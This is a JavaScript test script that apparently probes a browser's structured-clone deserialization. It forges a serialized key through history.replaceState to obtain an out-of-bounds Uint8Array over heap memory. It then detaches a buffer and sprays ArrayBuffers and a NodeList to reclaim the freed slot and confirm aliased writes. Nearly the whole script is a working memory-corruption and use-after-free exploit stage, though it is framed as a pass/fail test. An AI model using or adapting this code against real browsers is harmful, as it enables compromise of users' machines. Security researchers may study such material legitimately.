// Test whether a pointer-bearing StaticNodeList can occupy a released fixed-buffer slot.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var fixed = new ArrayBuffer(65536);
  new Uint8Array(fixed).fill(0x91);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  filler[2] = fixed;
  for (var i = 3; i < 27; i++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + i);
    filler[i] = neighbor;
  }
  for (var j = 27; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  phase = "store";
  history.replaceState(input, "");
  mark("node_slot_stored");
  phase = "load";
  var output = history.state;
  mark("node_slot_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var cloned = new Uint8Array(output.filler[2]);
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
    target.byteLength === 8 && cloned.length === 65536;
  var regionLength = 262144;
  var first = -1;
  var changes = 0;
  var before = null;
  var sampled = [];
  var matchedIndex = -1;
  var afterNormalWrite = null;
  var afterRestore = null;
  var oldLength = null;
  var listLength = null;
  if (valid) {
    phase = "locate";
    var baseline = new Uint8Array(regionLength);
    for (var k = 0; k < regionLength; k++) baseline[k] = synthetic[k];
    cloned.fill(0xc4);
    for (var a = 0; a < regionLength; a++) {
      if (synthetic[a] !== baseline[a]) {
        changes++;
        if (first < 0) first = a;
      }
    }
    if (first >= 0 && first + 65536 > regionLength) {
      for (var tail = regionLength; tail < first + 65536; tail++)
        if (synthetic[tail] === 0xc4) changes++;
    }
    cloned.fill(0x91);
    mark("node_slot_located");
    if (changes === 65536 && first >= 0 &&
        synthetic[first] === 0x91 && synthetic[first + 65535] === 0x91) {
      phase = "transfer";
      before = synthetic[first];
      structuredClone(0, { transfer: [output.filler[2]] });
      oldLength = cloned.length;
      mark("node_slot_detached");
      phase = "build_node_list";
      var root = document.createElement("div");
      var fragment = document.createDocumentFragment();
      for (var d = 0; d < 8192; d++)
        fragment.appendChild(document.createElement("span"));
      root.appendChild(fragment);
      var list = root.querySelectorAll("span");
      listLength = list.length;
      mark("node_slot_list_ready");
      phase = "spray_guard";
      var spray = [];
      for (var s = 0; s < 16; s++) {
        var buffer = new ArrayBuffer(65536);
        var view = new Uint8Array(buffer);
        view.fill(0x20 + s);
        spray.push(view);
      }
      mark("node_slot_guard_ready");
      phase = "read_slot";
      for (var t = 0; t < 32; t++) sampled.push(synthetic[first + t]);
      mark("node_slot_read_done");
      for (var n = 0; n < spray.length; n++) {
        if (sampled.slice(0, 8).every(function(value) { return value === 0x20 + n; })) {
          matchedIndex = n;
          break;
        }
      }
      if (matchedIndex >= 0) {
        phase = "verify_alias";
        spray[matchedIndex][0] = 0xd7;
        afterNormalWrite = synthetic[first];
        spray[matchedIndex][0] = 0x20 + matchedIndex;
        afterRestore = synthetic[first];
        mark("node_slot_alias_checked");
      }
    }
  }
  var expected = valid && changes === 65536 && before === 0x91 &&
    oldLength === 0 && listLength === 8192 && sampled.length === 32;
  result = { id: "node_list_slot", status: expected ? "pass" : "fail", details: {
    view_valid: valid, first_index: first, changed_bytes: changes,
    before: before, old_length: oldLength, node_list_length: listLength,
    sampled: sampled.join(","), matched_index: matchedIndex,
    after_normal_write: afterNormalWrite, after_restore: afterRestore,
    original_first: new Uint8Array(fixed)[0],
    target_first: new Uint8Array(target)[0]
  } };
} catch (error) {
  result = { id: "node_list_slot", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
